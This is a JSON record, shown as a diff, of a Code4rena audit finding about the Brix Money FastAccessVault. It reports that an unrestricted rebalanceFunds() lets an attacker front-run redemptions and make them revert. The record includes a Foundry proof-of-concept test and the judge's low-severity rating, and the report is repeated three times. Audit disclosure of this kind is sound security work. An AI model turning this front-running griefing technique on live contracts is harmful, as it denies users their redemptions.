@@ -1,0 +1,108 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Brix Money_qy7NXr77sDh",
+    "audit_uid": "qy7NXr77sDh",
+    "requested_submission_uid": "FbVYKzVY2hR",
+    "requested_finding_uid": "cSNXN84Wruw",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Brix_Money_qy7NXr77sDh/20260618_144946/findings.json",
+    "source_submission_uid": "FbVYKzVY2hR",
+    "source_finding_uid": "cSNXN84Wruw",
+    "original_report_path": "Brix Money_qy7NXr77sDh\\low_valid_FbVYKzVY2hR.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "FbVYKzVY2hR",
+  "finding_uid": "cSNXN84Wruw",
+  "finding_number": "14",
+  "title": "External FastAccessVault::rebalanceFunds Allows Front-Running to DoS User Redemptions",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "",
+  "user_handle": "0xGutzzz",
+  "body": "## Description\nThe `FastAccessVault` contract has a critical race condition vulnerability where anyone can call `rebalanceFunds()` to drain excess funds immediately before a user's redemption, causing the redemption to fail and defeating the vault's purpose of providing instant redemptions.\nThe `rebalanceFunds()` function is external with no access control, allowing anyone to trigger it.  When called, it immediately transfers excess funds above the target buffer to the custodian. \n```solidity\n/// @inheritdoc IFastAccessVault\n    function rebalanceFunds() external { //@ > External function can cause race condition where bad user can frontrun to DoS the vault.\n        uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();\n        uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);\n        uint256 currentBalance = _vaultToken.balanceOf(address(this));\n\n```\n\nThe `IFastAccessVault` contract also lacks the onlyOwner check making this attack possible\n```solidity\n /**\n     * @notice Rebalance the vault to match target buffer levels\n     * @dev Only callable by owner. Requests top-up from custodian if under target,\n     *      or transfers excess to custodian if over target\n     *\n     */\n    function rebalanceFunds() external; //@> Natspec said only owner can call, but implementation lacks that check.\n\n```\nAn attacker can monitor the mempool for redemption transactions and front-run them by calling `rebalanceFunds()` to drain the vault's buffer. When the user's redemption transaction executes, `processTransfer()` will revert with `InsufficientBufferBalance` because the vault no longer has sufficient funds \n\n## Impact\n* Undermines the core purpose of `FastAccessVault`: \"instant iTRY redemptions without custodian delays\"\n* Creates a denial-of-service condition for legitimate users\n* An attacker can consistently block large withdrawals at little cost, disrupting protocol operations.\n* Can be exploited repeatedly to disrupt protocol operations\n\n## Recommended mitigation steps\n* Implement `onlyOwner` check on `rebalanceFunds()`",
+  "proof_of_concept": "The following test function was added to the `FastAccessVault.t.sol` test file and produced these logs:\n```bash\nRan 1 test for test/FastAccessVault.t.sol:FastAccessVaultTest\n[PASS] test_FrontRunRebalance_DoS() (gas: 79215)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 37.32ms (10.20ms CPU time)\n\nRan 1 test suite in 298.68ms (37.32ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nThe test:\n```solidity\n    /// @notice PoC: Front-running rebalanceFunds causes DoS on legitimate transfers\n    /// @dev Demonstrates how public rebalanceFunds can be used to grief redemptions\n    function test_FrontRunRebalance_DoS() public {\n        // 1. Setup Scenario\n        // Set Target Buffer to 50% for clear math (Default is 5%)\n        vault.setTargetBufferPercentage(5000); \n\n        //  Set Minimum Buffer to 0. \n        // Otherwise, the default 50k minimum overrides our calculated target (1000)\n        vault.setMinimumBufferBalance(0);\n\n        // Set AUM to 2000. Target Buffer = 50% of 2000 = 1000.\n        _updateAUM(2000e18);\n        \n        // Fund Vault with 1500 (Overfunded).\n        // Current (1500) > Target (1000).\n        _setupVaultWithBalance(1500e18);\n\n        // 2. Valid User Intent\n        // User wants to redeem 1200. \n        // 1500 (Available) > 1200 (Request). This SHOULD succeed.\n        uint256 redemptionAmount = 1200e18;\n\n        \n        // 3. The Attack\n        // Attacker sees pending transaction and calls rebalanceFunds()\n        vm.prank(attacker);\n        vault.rebalanceFunds();\n\n        // 4. Result Verification\n        // Vault is drained to Target (1000)\n        assertEq(vault.getAvailableBalance(), 1000e18, \"Vault should be drained to target\");\n\n        // User transaction reverts because 1000 < 1200\n        vm.prank(address(issuerContract));\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                IFastAccessVault.InsufficientBufferBalance.selector, \n                redemptionAmount, \n                1000e18\n            )\n        );\n        vault.processTransfer(user1, redemptionAmount);\n    }\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-brix-money/blob/79e36aeda1b0091fa3ecd96f398517b31603f5d2/src/protocol/FastAccessVault.sol#L165-L181"
+  ],
+  "source_record": {
+    "project_id": "qy7NXr77sDh",
+    "submission_index": "56",
+    "api_submission_id": "",
+    "uid": "FbVYKzVY2hR",
+    "number": "56",
+    "title": "External FastAccessVault::rebalanceFunds Allows Front-Running to DoS User Redemptions",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "",
+    "handle": "0xGutzzz",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-brix-money/blob/79e36aeda1b0091fa3ecd96f398517b31603f5d2/src/protocol/FastAccessVault.sol#L165-L181"
+    ],
+    "body": "## Description\nThe `FastAccessVault` contract has a critical race condition vulnerability where anyone can call `rebalanceFunds()` to drain excess funds immediately before a user's redemption, causing the redemption to fail and defeating the vault's purpose of providing instant redemptions.\nThe `rebalanceFunds()` function is external with no access control, allowing anyone to trigger it.  When called, it immediately transfers excess funds above the target buffer to the custodian. \n```solidity\n/// @inheritdoc IFastAccessVault\n    function rebalanceFunds() external { //@ > External function can cause race condition where bad user can frontrun to DoS the vault.\n        uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();\n        uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);\n        uint256 currentBalance = _vaultToken.balanceOf(address(this));\n\n```\n\nThe `IFastAccessVault` contract also lacks the onlyOwner check making this attack possible\n```solidity\n /**\n     * @notice Rebalance the vault to match target buffer levels\n     * @dev Only callable by owner. Requests top-up from custodian if under target,\n     *      or transfers excess to custodian if over target\n     *\n     */\n    function rebalanceFunds() external; //@> Natspec said only owner can call, but implementation lacks that check.\n\n```\nAn attacker can monitor the mempool for redemption transactions and front-run them by calling `rebalanceFunds()` to drain the vault's buffer. When the user's redemption transaction executes, `processTransfer()` will revert with `InsufficientBufferBalance` because the vault no longer has sufficient funds \n\n## Impact\n* Undermines the core purpose of `FastAccessVault`: \"instant iTRY redemptions without custodian delays\"\n* Creates a denial-of-service condition for legitimate users\n* An attacker can consistently block large withdrawals at little cost, disrupting protocol operations.\n* Can be exploited repeatedly to disrupt protocol operations\n\n## Recommended mitigation steps\n* Implement `onlyOwner` check on `rebalanceFunds()`",
+    "proof_of_concept": "The following test function was added to the `FastAccessVault.t.sol` test file and produced these logs:\n```bash\nRan 1 test for test/FastAccessVault.t.sol:FastAccessVaultTest\n[PASS] test_FrontRunRebalance_DoS() (gas: 79215)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 37.32ms (10.20ms CPU time)\n\nRan 1 test suite in 298.68ms (37.32ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nThe test:\n```solidity\n    /// @notice PoC: Front-running rebalanceFunds causes DoS on legitimate transfers\n    /// @dev Demonstrates how public rebalanceFunds can be used to grief redemptions\n    function test_FrontRunRebalance_DoS() public {\n        // 1. Setup Scenario\n        // Set Target Buffer to 50% for clear math (Default is 5%)\n        vault.setTargetBufferPercentage(5000); \n\n        //  Set Minimum Buffer to 0. \n        // Otherwise, the default 50k minimum overrides our calculated target (1000)\n        vault.setMinimumBufferBalance(0);\n\n        // Set AUM to 2000. Target Buffer = 50% of 2000 = 1000.\n        _updateAUM(2000e18);\n        \n        // Fund Vault with 1500 (Overfunded).\n        // Current (1500) > Target (1000).\n        _setupVaultWithBalance(1500e18);\n\n        // 2. Valid User Intent\n        // User wants to redeem 1200. \n        // 1500 (Available) > 1200 (Request). This SHOULD succeed.\n        uint256 redemptionAmount = 1200e18;\n\n        \n        // 3. The Attack\n        // Attacker sees pending transaction and calls rebalanceFunds()\n        vm.prank(attacker);\n        vault.rebalanceFunds();\n\n        // 4. Result Verification\n        // Vault is drained to Target (1000)\n        assertEq(vault.getAvailableBalance(), 1000e18, \"Vault should be drained to target\");\n\n        // User transaction reverts because 1000 < 1200\n        vm.prank(address(issuerContract));\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                IFastAccessVault.InsufficientBufferBalance.selector, \n                redemptionAmount, \n                1000e18\n            )\n        );\n        vault.processTransfer(user1, redemptionAmount);\n    }\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/qy7NXr77sDh/submissions/56",
+    "raw": {
+      "auditUid": "qy7NXr77sDh",
+      "createdAt": "2025-11-27T16:40:50.640Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "vJSeNFJd5S2",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-02T06:44:33.179Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "cSNXN84Wruw"
+        },
+        {
+          "uid": "GagbghN89cN",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-02T06:44:35.271Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "cSNXN84Wruw"
+        }
+      ],
+      "finding": {
+        "uid": "cSNXN84Wruw",
+        "number": 14,
+        "duplicates": 30
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": null,
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-12-04T23:10:55.454Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "External FastAccessVault::rebalanceFunds Allows Front-Running to DoS User Redemptions",
+      "uid": "FbVYKzVY2hR",
+      "updatedAt": "2025-11-27T16:40:50.640Z",
+      "user": {
+        "uid": "p3bcUEVoSLG",
+        "handle": "0xGutzzz"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Description\nThe `FastAccessVault` contract has a critical race condition vulnerability where anyone can call `rebalanceFunds()` to drain excess funds immediately before a user's redemption, causing the redemption to fail and defeating the vault's purpose of providing instant redemptions.\nThe `rebalanceFunds()` function is external with no access control, allowing anyone to trigger it.  When called, it immediately transfers excess funds above the target buffer to the custodian. \n```solidity\n/// @inheritdoc IFastAccessVault\n    function rebalanceFunds() external { //@ > External function can cause race condition where bad user can frontrun to DoS the vault.\n        uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();\n        uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);\n        uint256 currentBalance = _vaultToken.balanceOf(address(this));\n\n```\n\nThe `IFastAccessVault` contract also lacks the onlyOwner check making this attack possible\n```solidity\n /**\n     * @notice Rebalance the vault to match target buffer levels\n     * @dev Only callable by owner. Requests top-up from custodian if under target,\n     *      or transfers excess to custodian if over target\n     *\n     */\n    function rebalanceFunds() external; //@> Natspec said only owner can call, but implementation lacks that check.\n\n```\nAn attacker can monitor the mempool for redemption transactions and front-run them by calling `rebalanceFunds()` to drain the vault's buffer. When the user's redemption transaction executes, `processTransfer()` will revert with `InsufficientBufferBalance` because the vault no longer has sufficient funds \n\n## Impact\n* Undermines the core purpose of `FastAccessVault`: \"instant iTRY redemptions without custodian delays\"\n* Creates a denial-of-service condition for legitimate users\n* An attacker can consistently block large withdrawals at little cost, disrupting protocol operations.\n* Can be exploited repeatedly to disrupt protocol operations\n\n## Recommended mitigation steps\n* Implement `onlyOwner` check on `rebalanceFunds()`",
+      "proofOfConcept": "The following test function was added to the `FastAccessVault.t.sol` test file and produced these logs:\n```bash\nRan 1 test for test/FastAccessVault.t.sol:FastAccessVaultTest\n[PASS] test_FrontRunRebalance_DoS() (gas: 79215)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 37.32ms (10.20ms CPU time)\n\nRan 1 test suite in 298.68ms (37.32ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nThe test:\n```solidity\n    /// @notice PoC: Front-running rebalanceFunds causes DoS on legitimate transfers\n    /// @dev Demonstrates how public rebalanceFunds can be used to grief redemptions\n    function test_FrontRunRebalance_DoS() public {\n        // 1. Setup Scenario\n        // Set Target Buffer to 50% for clear math (Default is 5%)\n        vault.setTargetBufferPercentage(5000); \n\n        //  Set Minimum Buffer to 0. \n        // Otherwise, the default 50k minimum overrides our calculated target (1000)\n        vault.setMinimumBufferBalance(0);\n\n        // Set AUM to 2000. Target Buffer = 50% of 2000 = 1000.\n        _updateAUM(2000e18);\n        \n        // Fund Vault with 1500 (Overfunded).\n        // Current (1500) > Target (1000).\n        _setupVaultWithBalance(1500e18);\n\n        // 2. Valid User Intent\n        // User wants to redeem 1200. \n        // 1500 (Available) > 1200 (Request). This SHOULD succeed.\n        uint256 redemptionAmount = 1200e18;\n\n        \n        // 3. The Attack\n        // Attacker sees pending transaction and calls rebalanceFunds()\n        vm.prank(attacker);\n        vault.rebalanceFunds();\n\n        // 4. Result Verification\n        // Vault is drained to Target (1000)\n        assertEq(vault.getAvailableBalance(), 1000e18, \"Vault should be drained to target\");\n\n        // User transaction reverts because 1000 < 1200\n        vm.prank(address(issuerContract));\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                IFastAccessVault.InsufficientBufferBalance.selector, \n                redemptionAmount, \n                1000e18\n            )\n        );\n        vault.processTransfer(user1, redemptionAmount);\n    }\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-brix-money/blob/79e36aeda1b0091fa3ecd96f398517b31603f5d2/src/protocol/FastAccessVault.sol#L165-L181",
+      "number": 56,
+      "aiExplanation": null,
+      "_index": 56
+    }
+  }
+}
